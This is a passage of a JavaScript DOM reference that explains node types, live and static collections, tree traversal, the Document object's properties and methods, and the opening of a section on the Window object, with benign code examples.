- **DocumentAndElementEventHandlers** (mixin)
- **GlobalEventHandlers** (mixin)
- **WindowEventHandlers** (mixin)
- **Slottable** (mixin)
- **ElementCSSInlineStyle** (mixin)
- **GeometryUtils** (mixin)
- **LinkStyle** (mixin)

---

**Note:** This hierarchy represents the standard DOM APIs as defined by W3C and WHATWG specifications. Some interfaces may vary across browser implementations, and newer APIs continue to be added to the DOM specification.

---

## DOM Tree Structure

### Hierarchical Organization

The DOM represents an HTML document as a tree of nodes where each element, attribute, text fragment, and comment becomes a node object. The `document` node serves as the root, with `<html>` as its child, branching downward through `<head>` and `<body>`, and continuing through all nested elements.

Each node maintains references to its parent, children, and siblings, creating a navigable graph structure. The `parentNode`, `childNodes`, `firstChild`, `lastChild`, `previousSibling`, and `nextSibling` properties enable traversal in any direction through the tree.

### Node Types and Interfaces

The DOM defines twelve node types, each with a numeric constant:

- **ELEMENT_NODE (1)**: Represents HTML elements (`<div>`, `<p>`, etc.)
- **ATTRIBUTE_NODE (2)**: Represents element attributes (deprecated in DOM4, attributes now accessed via properties)
- **TEXT_NODE (3)**: Contains text content between tags
- **CDATA_SECTION_NODE (4)**: Contains CDATA sections (XML documents)
- **PROCESSING_INSTRUCTION_NODE (7)**: Processing instructions like `<?xml-stylesheet?>`
- **COMMENT_NODE (8)**: Represents HTML comments
- **DOCUMENT_NODE (9)**: The document root
- **DOCUMENT_TYPE_NODE (10)**: The DOCTYPE declaration
- **DOCUMENT_FRAGMENT_NODE (11)**: Lightweight container for DOM manipulation

Each node type implements specific interfaces. `Element` nodes inherit from `Node` and add properties like `tagName`, `className`, `id`, and methods like `getAttribute()`, `setAttribute()`, `classList`. `Text` nodes inherit from `CharacterData`, providing `data`, `length`, and text manipulation methods.

### Parent-Child Relationships

Nodes form parent-child relationships following HTML nesting rules. A parent node's `childNodes` property returns a live `NodeList` containing all children in document order. `children` provides an `HTMLCollection` containing only element children, excluding text and comment nodes.

The `hasChildNodes()` method checks for children, while `contains()` determines if a node is a descendant. `appendChild()`, `insertBefore()`, `removeChild()`, and `replaceChild()` modify the tree structure, automatically updating all relationships and triggering reflows.

### Element Node Properties

Element nodes expose numerous properties for inspection and manipulation:

- **Identity**: `nodeName` (uppercase tag name), `tagName` (identical to nodeName for elements), `localName` (lowercase tag name)
- **Classification**: `nodeType` (always 1 for elements), `nodeValue` (always null for elements)
- **Attributes**: `attributes` (NamedNodeMap), `id`, `className`, `classList` (DOMTokenList)
- **Content**: `innerHTML`, `outerHTML`, `textContent`, `innerText`
- **Position**: `offsetParent`, `offsetTop`, `offsetLeft`, `clientTop`, `clientLeft`

### Text Nodes and Whitespace

Text nodes contain character data between element tags. Browsers create text nodes for all text, including whitespace from formatting. This means:

```html
<div>
  <span>Text</span>
</div>
```

Creates five nodes: the `div` element, a text node with whitespace, the `span` element, a text node with "Text", and another whitespace text node. Adjacent text nodes can be consolidated using `normalize()`.

The `textContent` property recursively concatenates all descendant text nodes, while `innerText` respects CSS styling and visibility, excluding hidden content and accounting for line breaks from block elements.

### Document Fragments

`DocumentFragment` nodes serve as lightweight containers that hold multiple nodes without a parent. When a fragment is inserted into the DOM, only its children are inserted, not the fragment itself. This enables batch DOM operations with a single reflow:

```javascript
const fragment = document.createDocumentFragment();
for (let i = 0; i < 1000; i++) {
  const div = document.createElement('div');
  fragment.appendChild(div);
}
document.body.appendChild(fragment); // Single reflow
```

### Live vs Static Collections

The DOM returns two types of collections:

**NodeList**: Returned by `childNodes` and `querySelectorAll()`. The former is live (updates automatically when the DOM changes), the latter is static (snapshot at query time).

**HTMLCollection**: Returned by `children`, `getElementsByTagName()`, `getElementsByClassName()`. Always live, reflecting DOM changes immediately. Accessing by index or name remains valid even as elements are added/removed.

Live collections can cause issues in loops if modifications occur during iteration:

```javascript
const divs = document.getElementsByTagName('div');
for (let i = 0; i < divs.length; i++) {
  document.body.appendChild(divs[i]); // Moves elements, changes collection
}
```

### Shadow DOM and Encapsulation

Shadow DOM creates isolated subtrees attached to elements via `attachShadow()`. The shadow root becomes a document fragment-like node with its own tree structure, isolated from the main document's CSS and JavaScript.

Shadow trees have shadow hosts (the element they're attached to) and can contain slots for content distribution. `mode: 'open'` allows external access via `element.shadowRoot`, while `mode: 'closed'` prevents external access [Inference: though the reference can still be captured during creation].

Multiple shadow trees can exist on a page, each maintaining separate DOM tree structures with their own node hierarchies, but all ultimately rendering within the same document.

### Tree Modification Performance

DOM modifications trigger reflows and repaints. Each structural change potentially invalidates layout calculations for ancestor and descendant nodes. Operations that minimize tree modifications:

- **Batch modifications**: Use `DocumentFragment` or build HTML strings with `innerHTML`
- **Detach-modify-reattach**: Remove elements during complex modifications using `removeChild()`, modify them, then reinsert
- **Clone deeply**: Use `cloneNode(true)` for duplicating entire subtrees instead of rebuilding manually
- **CSS classes**: Toggle `className` or `classList` instead of modifying individual style properties

[Inference: Layout thrashing occurs when reading layout properties (offsetHeight, getBoundingClientRect) immediately after modifications, forcing synchronous reflows].

### Traversal APIs

Beyond direct property access, the DOM provides traversal interfaces:

**TreeWalker**: Created via `document.createTreeWalker()`, provides `nextNode()`, `previousNode()`, `firstChild()`, `lastChild()`, `parentNode()`, `nextSibling()`, `previousSibling()` methods with filtering capabilities. The `whatToShow` bitmask controls which node types are visited, and `filter` enables custom acceptance logic.

**NodeIterator**: Created via `document.createNodeIterator()`, offers simpler forward/backward iteration with `nextNode()` and `previousNode()`. Unlike TreeWalker, it maintains a reference position that updates automatically when nodes are removed from the tree.

Both APIs accept `NodeFilter` callbacks for fine-grained control over traversal, returning `FILTER_ACCEPT`, `FILTER_REJECT`, or `FILTER_SKIP` to control iteration behavior.

### Mutation Observation

`MutationObserver` monitors DOM tree changes asynchronously. Observers register interest in specific mutation types:

- `childList`: Child node additions/removals
- `attributes`: Attribute modifications
- `characterData`: Text content changes
- `subtree`: Apply observation to all descendants

The observer callback receives `MutationRecord` objects describing each change, including `type`, `target`, `addedNodes`, `removedNodes`, `attributeName`, `oldValue`, and other context. This enables reactive patterns without polling or synchronous event handlers that could impact performance.

### Node Comparison and Position

The `compareDocumentPosition()` method returns a bitmask indicating the relative position of two nodes:

- `DOCUMENT_POSITION_DISCONNECTED` (1): Nodes in different documents
- `DOCUMENT_POSITION_PRECEDING` (2): Other node precedes this node
- `DOCUMENT_POSITION_FOLLOWING` (4): Other node follows this node
- `DOCUMENT_POSITION_CONTAINS` (8): Other node contains this node
- `DOCUMENT_POSITION_CONTAINED_BY` (16): This node contains other node
- `DOCUMENT_POSITION_IMPLEMENTATION_SPECIFIC` (32): Implementation-specific ordering

`isSameNode()` checks reference equality, while `isEqualNode()` performs deep comparison of node trees, checking tag names, attributes, and descendant structure.

---

## Nodes and Node Types (DOM)

### Node Interface Hierarchy

The DOM represents documents as a tree of nodes, where every element, attribute, text fragment, and structural component is a node. The `Node` interface serves as the primary base type from which all DOM node types inherit.

```
Node (base interface)
├── Document
├── DocumentFragment
├── DocumentType
├── Element
│   ├── HTMLElement
│   │   ├── HTMLDivElement
│   │   ├── HTMLSpanElement
│   │   └── (other HTML elements)
│   └── SVGElement
├── Attr
├── CharacterData
│   ├── Text
│   ├── Comment
│   └── ProcessingInstruction
└── CDATASection
```

### Node Type Constants

Every node has a `nodeType` property that returns an integer constant identifying its type:

|Constant|Value|Node Type|Description|
|---|---|---|---|
|`Node.ELEMENT_NODE`|1|Element|HTML or XML element|
|`Node.ATTRIBUTE_NODE`|2|Attr|Element attribute (deprecated in DOM4)|
|`Node.TEXT_NODE`|3|Text|Text content within elements|
|`Node.CDATA_SECTION_NODE`|4|CDATASection|CDATA section in XML|
|`Node.PROCESSING_INSTRUCTION_NODE`|7|ProcessingInstruction|Processing instruction|
|`Node.COMMENT_NODE`|8|Comment|Comment node|
|`Node.DOCUMENT_NODE`|9|Document|Document root|
|`Node.DOCUMENT_TYPE_NODE`|10|DocumentType|DOCTYPE declaration|
|`Node.DOCUMENT_FRAGMENT_NODE`|11|DocumentFragment|Lightweight document container|

**Note:** Node types 5 (ENTITY_REFERENCE_NODE), 6 (ENTITY_NODE), and 12 (NOTATION_NODE) are deprecated and no longer used in modern DOM implementations.

### Element Nodes (Type 1)

Element nodes represent HTML or XML tags and form the structural backbone of the DOM tree.

**Key Properties:**

- `tagName`: Uppercase tag name (e.g., "DIV", "SPAN")
- `localName`: Lowercase local name
- `namespaceURI`: Namespace URI (null for HTML documents)
- `attributes`: NamedNodeMap of attributes
- `classList`: DOMTokenList for class manipulation
- `className`: String of space-separated classes
- `id`: Element identifier

**Child Node Rules:** Element nodes can contain:

- Other Element nodes
- Text nodes
- Comment nodes
- ProcessingInstruction nodes
- CDATASection nodes (XML only)

**Navigation Properties:**

- `children`: HTMLCollection of child elements only
- `childNodes`: NodeList of all child nodes
- `firstElementChild` / `lastElementChild`: First/last child elements
- `nextElementSibling` / `previousElementSibling`: Adjacent elements

### Text Nodes (Type 3)

Text nodes contain the actual text content within elements. They cannot have children and represent leaf nodes in the DOM tree.

**Characteristics:**

- `nodeValue` and `data` properties contain the text string
- `wholeText` returns concatenated text of all adjacent text nodes
- Whitespace (spaces, tabs, newlines) creates text nodes
- Empty text nodes can exist but are often normalized away

**Text Node Manipulation:**

```javascript
const textNode = document.createTextNode("Hello");
textNode.appendData(" World"); // "Hello World"
textNode.insertData(5, ","); // "Hello, World"
textNode.deleteData(5, 1); // "Hello World"
textNode.replaceData(6, 5, "Universe"); // "Hello Universe"
textNode.substringData(0, 5); // "Hello"
```

**Whitespace Handling:** Browsers create text nodes for whitespace between elements in HTML source:

```html
<div>
  <span>Text</span>
  <span>More</span>
</div>
```

This creates text nodes containing newlines and spaces between the `<span>` elements. Use `nodeType === 3` checks when traversing to handle these.

### Comment Nodes (Type 8)

Comment nodes represent HTML/XML comments (`<!-- comment -->`).

**Properties:**

- `data`: Comment text content
- `length`: Number of characters
- Cannot have child nodes
- Often ignored in DOM traversal but preserved in the tree

**Use Cases:**

- Template markers in frameworks
- Conditional comments (legacy IE)
- Server-side include markers
- Documentation within markup

### Document Node (Type 9)

The Document node sits at the root of the DOM tree and represents the entire HTML or XML document.

**Key Properties:**

- `documentElement`: Reference to `<html>` element
- `doctype`: DocumentType node (the `<!DOCTYPE>` declaration)
- `head`: Reference to `<head>` element
- `body`: Reference to `<body>` element
- `implementation`: DOMImplementation object
- `URL`: Document location
- `domain`: Document domain
- `characterSet`: Character encoding

**Factory Methods:**

- `createElement(tagName)`: Create element nodes
- `createTextNode(data)`: Create text nodes
- `createComment(data)`: Create comment nodes
- `createDocumentFragment()`: Create document fragments
- `createAttribute(name)`: Create attribute nodes

### DocumentFragment Node (Type 11)

DocumentFragment serves as a lightweight container for grouping nodes without adding extra elements to the DOM tree.

**Key Advantages:**

- Not part of the active DOM tree
- Changes don't trigger reflows/repaints
- When inserted, only its children are added (the fragment itself disappears)
- Minimal memory overhead compared to full Document nodes

**Performance Pattern:**

```javascript
const fragment = document.createDocumentFragment();

for (let i = 0; i < 1000; i++) {
  const div = document.createElement('div');
  div.textContent = `Item ${i}`;
  fragment.appendChild(div); // No reflow yet
}

container.appendChild(fragment); // Single reflow for all 1000 elements
```

### DocumentType Node (Type 10)

Represents the `<!DOCTYPE>` declaration at the beginning of HTML/XML documents.

**Properties:**

- `name`: Document type name (e.g., "html")
- `publicId`: Public identifier
- `systemId`: System identifier
- Accessed via `document.doctype`

**Example:**

```javascript
// <!DOCTYPE html>
console.log(document.doctype.name); // "html"
console.log(document.doctype.publicId); // ""
console.log(document.doctype.systemId); // ""
```

### Attribute Nodes (Type 2)

**[Note: Deprecated]** While attribute nodes technically exist with `nodeType === 2`, they are no longer treated as children of elements in modern DOM specifications (DOM4+).

**Modern Attribute Access:**

- `element.attributes`: Returns NamedNodeMap
- `element.getAttribute(name)`: Get attribute value
- `element.setAttribute(name, value)`: Set attribute
- `element.hasAttribute(name)`: Check existence
- `element.removeAttribute(name)`: Remove attribute

**Attribute Node Structure (when accessed):**

```javascript
const attr = element.attributes[0]; // or element.getAttributeNode('id')
attr.name; // Attribute name
attr.value; // Attribute value
attr.ownerElement; // Element that owns this attribute
```

### ProcessingInstruction Nodes (Type 7)

Used in XML documents for processing instructions like `<?xml-stylesheet ?>`.

**Properties:**

- `target`: Instruction target (first token)
- `data`: Instruction data (everything after target)
- Rare in HTML documents
- Common in XML for stylesheets, transformations

### CDATASection Nodes (Type 4)

XML-specific nodes for character data that should not be parsed as markup.

```xml
<script><![CDATA[
  function example() {
    if (x < 10 && y > 5) { }
  }
]]></script>
```

**Characteristics:**

- Inherits from Text node
- Content is not parsed for markup
- Not used in HTML documents
- `nodeValue` contains the raw CDATA content

### Node Properties and Methods

#### Universal Node Properties

Every node, regardless of type, has these properties:

- `nodeType`: Integer constant identifying node type
- `nodeName`: Name varies by type (tagName for elements, "#text" for text, etc.)
- `nodeValue`: Value varies by type (text content for text nodes, null for elements)
- `parentNode`: Parent node reference
- `childNodes`: Live NodeList of children
- `firstChild` / `lastChild`: First/last child node references
- `previousSibling` / `nextSibling`: Adjacent sibling references
- `ownerDocument`: Reference to containing document

#### Tree Traversal Methods

**Modification:**

- `appendChild(node)`: Add node to end of children
- `insertBefore(newNode, referenceNode)`: Insert before reference
- `removeChild(node)`: Remove child node
- `replaceChild(newNode, oldNode)`: Replace existing child

**Cloning:**

- `cloneNode(deep)`: Create copy (shallow if false, deep if true)

**Comparison:**

- `contains(otherNode)`: Check if node is descendant
- `compareDocumentPosition(otherNode)`: Determine relative position
- `isEqualNode(otherNode)`: Check structural equality
- `isSameNode(otherNode)`: Check reference equality

**Normalization:**

- `normalize()`: Merge adjacent text nodes, remove empty ones

### NodeList vs HTMLCollection

**NodeList:**

- Generic collection of nodes
- Can be live or static depending on creation method
- `document.querySelectorAll()` returns static NodeList
- `childNodes` returns live NodeList
- Indexed access: `nodeList[0]`
- Iterable with `forEach()` in modern browsers

**HTMLCollection:**

- Specifically for element nodes
- Always live (reflects DOM changes)
- `children`, `getElementsByTagName()`, `getElementsByClassName()` return HTMLCollection
- Named item access: `collection.namedItem('id')` or `collection['id']`
- No `forEach()` method (must convert to array or use for-of)

### Live vs Static Collections

**Live Collections:** Automatically update when the DOM changes:

```javascript
const divs = document.getElementsByTagName('div'); // Live
console.log(divs.length); // 5

document.body.appendChild(document.createElement('div'));
console.log(divs.length); // 6 (automatically updated)
```

**Static Collections:** Snapshot at time of creation:

```javascript
const divs = document.querySelectorAll('div'); // Static
console.log(divs.length); // 5

document.body.appendChild(document.createElement('div'));
console.log(divs.length); // 5 (unchanged)
```

### Node Type Checking Patterns

**Type-Safe Traversal:**

```javascript
function getElementChildren(parent) {
  const elements = [];
  for (let node = parent.firstChild; node; node = node.nextSibling) {
    if (node.nodeType === Node.ELEMENT_NODE) {
      elements.push(node);
    }
  }
  return elements;
}
```

**Filtering Non-Element Nodes:**

```javascript
function getTextContent(element) {
  let text = '';
  for (let node of element.childNodes) {
    if (node.nodeType === Node.TEXT_NODE) {
      text += node.nodeValue;
    } else if (node.nodeType === Node.ELEMENT_NODE) {
      text += getTextContent(node); // Recursive
    }
    // Ignore comments, processing instructions, etc.
  }
  return text;
}
```

### Node Type Inheritance and instanceof

Nodes can be tested using `instanceof`:

```javascript
const div = document.createElement('div');

div instanceof Node // true
div instanceof Element // true
div instanceof HTMLElement // true
div instanceof HTMLDivElement // true

const text = document.createTextNode('Hello');
text instanceof Node // true
text instanceof CharacterData // true
text instanceof Text // true
text instanceof Element // false
```

### Memory and Performance Considerations

**NodeList Iteration Performance:** Cache length when iterating live NodeLists:

```javascript
// Inefficient (length recalculated each iteration)
for (let i = 0; i < nodeList.length; i++) { }

// Efficient
const len = nodeList.length;
for (let i = 0; i < len; i++) { }
```

**DocumentFragment for Batch Operations:** [Inference: Based on browser rendering behavior] Reduces reflow/repaint cycles by batching DOM modifications:

```javascript
// Multiple reflows
for (let i = 0; i < 100; i++) {
  container.appendChild(createItem(i)); // Reflow per append
}

// Single reflow
const fragment = document.createDocumentFragment();
for (let i = 0; i < 100; i++) {
  fragment.appendChild(createItem(i));
}
container.appendChild(fragment); // One reflow
```

### Text Node Normalization

Adjacent text nodes can occur after DOM manipulation:

```javascript
const div = document.createElement('div');
div.appendChild(document.createTextNode('Hello '));
div.appendChild(document.createTextNode('World'));

console.log(div.childNodes.length); // 2

div.normalize(); // Merge adjacent text nodes
console.log(div.childNodes.length); // 1
console.log(div.firstChild.nodeValue); // "Hello World"
```

### Shadow DOM and Node Types

Shadow DOM introduces `ShadowRoot` nodes that act as document fragments:

```javascript
const host = document.createElement('div');
const shadowRoot = host.attachShadow({ mode: 'open' });

shadowRoot.nodeType // 11 (DOCUMENT_FRAGMENT_NODE)
shadowRoot instanceof DocumentFragment // true
shadowRoot instanceof ShadowRoot // true
```

Shadow roots encapsulate subtrees and affect node traversal from the outside.

### Node Adoption Across Documents

Nodes belong to specific documents. Moving nodes between documents requires adoption:

```javascript
const iframe = document.querySelector('iframe');
const iframeDoc = iframe.contentDocument;
const div = iframeDoc.createElement('div');

// div belongs to iframe's document
console.log(div.ownerDocument === iframeDoc); // true

// Adopt into main document
const adopted = document.adoptNode(div);
console.log(adopted.ownerDocument === document); // true

// Or import (creates a copy)
const imported = document.importNode(div, true);
```

### Custom Elements and Node Types

Custom elements are still `ELEMENT_NODE` type but extend HTMLElement:

```javascript
class MyElement extends HTMLElement {
  constructor() {
    super();
  }
}

customElements.define('my-element', MyElement);

const elem = document.createElement('my-element');
elem.nodeType // 1 (ELEMENT_NODE)
elem instanceof HTMLElement // true
elem instanceof MyElement // true

// Types of customElements
customElements instanceof CustomElementRegistry // true
typeof customElements // "object"
```

The `customElements` is an instance of `CustomElementRegistry`, which is a global object that provides methods for registering custom elements and querying registered elements. It's available as a property on the `window` object (`window.customElements`).

### Practical Node Type Utilities

**Get All Text Nodes:**

```javascript
function getAllTextNodes(element) {
  const textNodes = [];
  const walker = document.createTreeWalker(
    element,
    NodeFilter.SHOW_TEXT,
    null
  );
  
  let node;
  while (node = walker.nextNode()) {
    textNodes.push(node);
  }
  return textNodes;
}
```

**Remove Comment Nodes:**

```javascript
function removeComments(element) {
  const iterator = document.createNodeIterator(
    element,
    NodeFilter.SHOW_COMMENT
  );
  
  const comments = [];
  let node;
  while (node = iterator.nextNode()) {
    comments.push(node);
  }
  
  comments.forEach(comment => comment.remove());
}
```

**Count Node Types:**

```javascript
function countNodeTypes(element) {
  const counts = {};
  const walker = document.createTreeWalker(
    element,
    NodeFilter.SHOW_ALL
  );
  
  let node;
  while (node = walker.nextNode()) {
    counts[node.nodeType] = (counts[node.nodeType] || 0) + 1;
  }
  return counts;
}
```

---

## Document Object

The Document object represents the entire HTML or XML document loaded in the browser. It serves as the entry point to the DOM tree and provides methods and properties for accessing and manipulating document content.

### Core Properties

#### document.documentElement

Returns the root element of the document (the `<html>` element in HTML documents). This is distinct from `document.body` and provides access to the topmost element in the DOM hierarchy.

#### document.body

References the `<body>` element. Returns `null` if accessed before the body element has been parsed. Can be set to replace the entire body element.

#### document.head

References the `<head>` element. Provides direct access to document metadata, scripts, and stylesheets in the head section.

#### document.title

Gets or sets the document's title as displayed in the browser tab. Modifying this property updates the `<title>` element content.

#### document.URL

Returns the complete URL of the document as a string. This is read-only and reflects the current location.

#### document.domain

Gets or sets the domain portion of the document's origin. Historically used for cross-origin communication between subdomains, though this is deprecated in favor of `postMessage`.

#### document.referrer

Returns the URL of the page that linked to the current page. Empty string if navigated directly or if the referrer was stripped.

#### document.lastModified

Returns the date and time the document was last modified as reported by the server.

#### document.readyState

Returns the loading state of the document:

- `"loading"` - document still loading
- `"interactive"` - document has finished loading but sub-resources are still loading
- `"complete"` - document and all sub-resources have finished loading

#### document.characterSet

Returns the character encoding used by the document (e.g., "UTF-8").

#### document.contentType

Returns the MIME type of the document (e.g., "text/html").

#### document.doctype

Returns the Document Type Declaration (DTD) associated with the document. Returns `null` if no doctype is present.

### Selection and Element Access

#### document.getElementById(id)

Returns the element with the specified ID attribute. Returns `null` if no matching element exists. Most performant selector method since IDs are indexed.

```javascript
const header = document.getElementById('main-header');
```

#### document.getElementsByClassName(className)

Returns a live HTMLCollection of elements with the specified class name. The collection updates automatically when the DOM changes.

```javascript
const buttons = document.getElementsByClassName('btn');
// Returns live collection - changes reflect immediately
```

#### document.getElementsByTagName(tagName)

Returns a live HTMLCollection of elements with the specified tag name. Pass `"*"` to get all elements.

```javascript
const paragraphs = document.getElementsByTagName('p');
const allElements = document.getElementsByTagName('*');
```

#### document.getElementsByName(name)

Returns a live NodeList of elements with the specified `name` attribute. Primarily used for form elements.

```javascript
const radios = document.getElementsByName('gender');
```

#### document.querySelector(selector)

Returns the first element matching the CSS selector. Returns `null` if no match found. Accepts any valid CSS selector syntax.

```javascript
const firstButton = document.querySelector('.btn.primary');
const nestedElement = document.querySelector('div > p:first-child');
```

#### document.querySelectorAll(selector)

Returns a static NodeList of all elements matching the CSS selector. Unlike live collections, this snapshot doesn't update when the DOM changes.

```javascript
const allButtons = document.querySelectorAll('.btn');
// Static NodeList - frozen at query time
```

### Element Creation and Manipulation

#### document.createElement(tagName, options)

Creates a new element node with the specified tag name. The element exists in memory but isn't part of the DOM until inserted.

```javascript
const div = document.createElement('div');
const customElement = document.createElement('my-component', { is: 'custom-element' });
```

#### document.createTextNode(text)

Creates a new text node containing the specified string. Text nodes cannot contain HTML markup.

```javascript
const textNode = document.createTextNode('Hello World');
element.appendChild(textNode);
```

#### document.createDocumentFragment()

Creates an empty DocumentFragment, which serves as a lightweight container for DOM nodes. Operations on fragments don't trigger reflows, making them efficient for batch DOM operations.

```javascript
const fragment = document.createDocumentFragment();
for (let i = 0; i < 1000; i++) {
  const li = document.createElement('li');
  fragment.appendChild(li);
}
container.appendChild(fragment); // Single reflow
```

#### document.createComment(data)

Creates a comment node with the specified text content.

```javascript
const comment = document.createComment('TODO: refactor this section');
```

#### document.createAttribute(name)

Creates an attribute node that can be set on elements. Modern practice favors `element.setAttribute()` instead.

#### document.importNode(externalNode, deep)

Imports a node from another document. The `deep` parameter determines whether to clone descendants. Required when moving nodes between documents.

```javascript
const nodeFromIframe = iframe.contentDocument.querySelector('.item');
const imported = document.importNode(nodeFromIframe, true);
```

#### document.adoptNode(externalNode)

Transfers a node from another document, removing it from its original document. Unlike `importNode`, this doesn't create a copy.

### Document Writing Methods

#### document.write(markup)

Writes HTML markup directly to the document stream. If called after page load, overwrites the entire document. Generally discouraged in modern development due to performance and security concerns.

```javascript
document.write('<p>This text appears in the document</p>');
```

#### document.writeln(markup)

Identical to `document.write()` but adds a newline character after the content.

#### document.open()

Opens the document stream for writing. Clears the current document content if called after page load.

#### document.close()

Closes the document stream opened by `document.open()`. Triggers the `DOMContentLoaded` event.

### Form Access

#### document.forms

Returns an HTMLCollection of all `<form>` elements in the document. Forms can be accessed by index or by their `name` or `id` attributes.

```javascript
const firstForm = document.forms[0];
const loginForm = document.forms['login'];
const namedForm = document.forms.namedItem('registration');
```

### Image Access

#### document.images

Returns an HTMLCollection of all `<img>` elements in the document.

### Link Access

#### document.links

Returns an HTMLCollection of all `<a>` and `<area>` elements with an `href` attribute.

#### document.anchors

Returns an HTMLCollection of all `<a>` elements with a `name` attribute. This is deprecated; use `id` attributes instead.

### Script Access

#### document.scripts

Returns an HTMLCollection of all `<script>` elements in the document.

### Style and CSS

#### document.styleSheets

Returns a StyleSheetList of all stylesheets explicitly linked or embedded in the document.

```javascript
for (let sheet of document.styleSheets) {
  console.log(sheet.href || 'inline styles');
}
```

#### document.createStyleSheet() [IE only, deprecated]

Internet Explorer-specific method for creating stylesheets programmatically.

### Document Events

#### document.addEventListener(type, listener, options)

Registers an event listener on the document. Document-level listeners capture events from the entire page through bubbling or capturing.

```javascript
document.addEventListener('click', (e) => {
  console.log('Clicked element:', e.target);
});

// Capture phase
document.addEventListener('focus', handler, { capture: true });
```

#### document.removeEventListener(type, listener, options)

Removes a previously registered event listener. The listener reference must match exactly.

#### Common Document Events

- `DOMContentLoaded` - Fired when HTML is parsed and DOM is ready (before images/stylesheets load)
- `readystatechange` - Fired when `document.readyState` changes
- `visibilitychange` - Fired when page visibility changes (tab switching, minimizing)
- `scroll` - Fired when document is scrolled
- `selectionchange` - Fired when text selection changes

### Focus Management

#### document.activeElement

Returns the element currently in focus. Returns `<body>` if no element has focus.

```javascript
console.log(document.activeElement); // Currently focused element
```

#### document.hasFocus()

Returns `true` if the document or any element within it has focus.

```javascript
if (document.hasFocus()) {
  // Document is in foreground
}
```

### Visibility API

#### document.hidden

Returns `true` if the page is hidden (minimized, background tab, etc.). Part of the Page Visibility API.

#### document.visibilityState

Returns the visibility state:

- `"visible"` - page content is at least partially visible
- `"hidden"` - page is not visible to the user

```javascript
document.addEventListener('visibilitychange', () => {
  if (document.hidden) {
    pauseVideo();
  } else {
    resumeVideo();
  }
});
```

### Cookie Management

#### document.cookie

Gets or sets cookies associated with the document. Returns a semicolon-separated string of all cookies. Setting this property adds or updates a cookie.

```javascript
// Get all cookies
const cookies = document.cookie;

// Set a cookie
document.cookie = "username=john; expires=Fri, 31 Dec 2024 23:59:59 GMT; path=/";

// Set with additional flags
document.cookie = "session=abc123; secure; samesite=strict";
```

### Full-Screen API

#### document.fullscreenElement

Returns the element currently displayed in fullscreen mode, or `null` if not in fullscreen.

#### document.exitFullscreen()

Exits fullscreen mode. Returns a Promise that resolves when fullscreen is exited.

```javascript
if (document.fullscreenElement) {
  document.exitFullscreen();
}
```

#### document.fullscreenEnabled

Returns `true` if fullscreen mode is available and can be activated.

### Document Position and Scrolling

#### document.documentElement.scrollTop

Gets or sets the vertical scroll position of the document. For cross-browser compatibility, check both `document.documentElement.scrollTop` and `document.body.scrollTop`.

```javascript
// Get scroll position
const scrollY = document.documentElement.scrollTop || document.body.scrollTop;

// Set scroll position
document.documentElement.scrollTop = 0; // Scroll to top
```

#### document.documentElement.scrollHeight

Returns the total scrollable height of the document, including content not visible on screen.

#### document.documentElement.clientHeight

Returns the visible height of the document viewport (without scrollbars).

### Range and Selection

#### document.createRange()

Creates a Range object representing a fragment of the document. Used for text selection and manipulation.

```javascript
const range = document.createRange();
range.selectNodeContents(element);
```

#### document.getSelection()

Returns a Selection object representing the text selected by the user or the current position of the cursor.

```javascript
const selection = document.getSelection();
const selectedText = selection.toString();
```

### Deprecated Properties and Methods

[Unverified: Browser support status may vary]

#### document.all

Legacy collection of all elements. Deprecated; use `document.querySelectorAll('*')` instead.

#### document.alinkColor, document.linkColor, document.vlinkColor

Deprecated properties for link colors. Use CSS instead.

#### document.bgColor, document.fgColor

Deprecated properties for background and foreground colors. Use CSS instead.

#### document.clear()

Deprecated method that did nothing in modern browsers.

### Implementation Notes

**HTMLCollection vs NodeList**

- HTMLCollection: Live, contains only Element nodes, accessible by name/id
- NodeList: Can be live or static, contains any node type, array-like iteration

**Performance Considerations**

- Live collections (HTMLCollection, live NodeList) re-query the DOM on every access
- Static NodeLists from `querySelectorAll()` are more performant for iteration
- `getElementById()` is faster than `querySelector('#id')` due to internal indexing
- DocumentFragments prevent multiple reflows during batch insertions

**Security Considerations**

- `document.write()` can enable XSS attacks and breaks page caching
- `document.cookie` provides no CSRF protection; use httpOnly cookies for sensitive data
- Same-origin policy restricts access to documents from different origins

---

## Window Object

### Core Properties and Identity

The `window` object represents the browser's window and serves as the global object in client-side JavaScript. All global variables, functions, and objects automatically become properties of `window`. The object implements the `Window` interface and provides access to the document, browser history, location, and various APIs.

`window.self`, `window.window`, and `window.frames` all reference the window itself. The `window.top` property references the topmost window in the hierarchy, while `window.parent` references the immediate parent frame. In a top-level browsing context, `window.top === window.self`.

### Dimensions and Viewport

`window.innerWidth` and `window.innerHeight` return the viewport dimensions in pixels, including scrollbars. These values update on resize and reflect the actual content area available for rendering.

`window.outerWidth` and `window.outerHeight` represent the entire browser window dimensions, including toolbars, borders, and browser chrome.

`window.screen` provides access to the `Screen` object with properties like `screen.width`, `screen.height`, `screen.availWidth`, `screen.availHeight`, `screen.colorDepth`, and `screen.pixelDepth`. The `avail` properties exclude taskbars and system UI elements.

`window.devicePixelRatio` returns the ratio between physical pixels and CSS pixels, crucial for high-DPI displays. A value of 2 means one CSS pixel equals four physical pixels (2×2).

`window.scrollX` (alias `pageXOffset`) and `window.scrollY` (alias `pageYOffset`) return the current scroll position in pixels. These are read-only; use `window.scrollTo()`, `window.scrollBy()`, or `window.scroll()` to programmatically scroll.

### Navigation and Location

`window.location` is a `Location` object providing URL manipulation:

- `location.href` - full URL (readable/writable)
- `location.protocol` - scheme (e.g., "https:")
- `location.host` - hostname with port
- `location.hostname` - hostname without port
- `location.port` - port number
- `location.pathname` - path portion
- `location.search` - query string including "?"
- `location.hash` - fragment identifier including "#"
- `location.origin` - protocol + host (read-only)

Methods include `location.assign(url)`, `location.replace(url)` (no history entry), `location.reload(forceReload)`, and `location.toString()`.

`window.history` provides access to the session history stack through the `History` interface:

- `history.length` - number of entries
- `history.state` - current state object
- `history.back()`, `history.forward()`, `history.go(delta)`
- `history.pushState(state, title, url)` - adds entry without navigation
- `history.replaceState(state, title, url)` - modifies current entry

The `popstate` event fires when active history entry changes via user navigation (not `pushState`/`replaceState`).

### Document and Frames

`window.document` references the DOM `Document` object. This is the primary interface for DOM manipulation and is equivalent to the global `document` variable.

`window.frames` returns a pseudo-array of frame/iframe windows. Access via index (`window.frames[0]`) or name (`window.frames['frameName']`). `window.length` returns the frame count.

`window.frameElement` returns the element (iframe/object) embedding the window, or `null` for top-level contexts. Cross-origin access restrictions apply.

`window.opener` references the window that opened the current window via `window.open()`. Returns `null` if no opener or if explicitly cleared for security (`window.opener = null`).

### Timers and Scheduling

